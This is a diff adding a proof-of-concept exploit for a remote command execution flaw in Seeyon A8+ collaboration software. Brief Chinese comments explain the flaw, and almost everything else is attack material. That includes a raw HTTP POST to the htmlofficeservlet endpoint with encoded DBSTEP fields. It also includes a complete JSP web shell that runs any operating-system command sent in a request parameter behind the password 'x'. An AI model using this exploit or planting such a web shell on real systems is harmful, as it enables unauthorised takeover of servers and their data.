@@ -1,0 +1,21 @@
+# 致远A8+协同管理软件远程命令执行漏洞
+# 致远互联是中国协同管理软件及云服务的供应商，专注专注在协同管理软件领域。
+# 致远A8+协同管理软件存在远程命令执行漏洞。攻击者通过上传精心构造的后门文件即可Getshell，获得目标服务器的权限。
+POST /seeyon/htmlofficeservlet?acid=80002081&bid=hd_tag_m8mv254i HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv254i
+RM-PRO-Token: d5db92969f1a2a12028a3e2dee15c68d
+RM-PRO-Time: 1742808438846
+User-Agent: curl/7.83.1
+
+id=DBSTEP V3. 0 343 0 658 DBSTEP=OKMLlKlV
+OPTION=S3WYOSWLBSGr
+currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+= WUghPB3szB3Xwg66 the CREATEDATE
+recordID = qLSGw4SXzLeGw4V3wUw3zUoXwid6
+originalFileId = wV66
+originalCreateDate = wUghPB3szB3Xwg66
+FILENAME = qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdb4o5nHzs
+needReadFile = yRWZdAS6
+originalCreateDate IZ = 66 = = wLSGP4oEzLKAz4
+<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder ();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine( )) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString() ;} %><%if("x".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("randstr"))){out.println("<pre>" +excuteCmd(request.getParameter("randstr")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
